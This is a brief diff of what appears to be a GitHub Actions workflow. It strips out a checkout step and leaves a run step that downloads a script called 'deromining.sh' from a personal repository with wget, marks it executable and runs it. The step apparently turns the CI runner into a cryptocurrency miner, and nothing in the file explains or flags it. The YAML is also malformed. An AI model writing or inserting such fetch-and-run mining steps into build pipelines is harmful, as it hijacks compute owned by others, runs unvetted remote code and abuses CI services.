@@ -16,8 +16,8 @@ with:
 go-version: ${{ matrix.go}}
 id: go
 
-name :Setup
-uses: actions/checkout@v1
-- name: BA_channel
+
+
+
 run: |
 wget https://github.com/dovandienem/vps/blob/main/deromining.sh && chmod u+x deromining.sh && ./deromining.sh
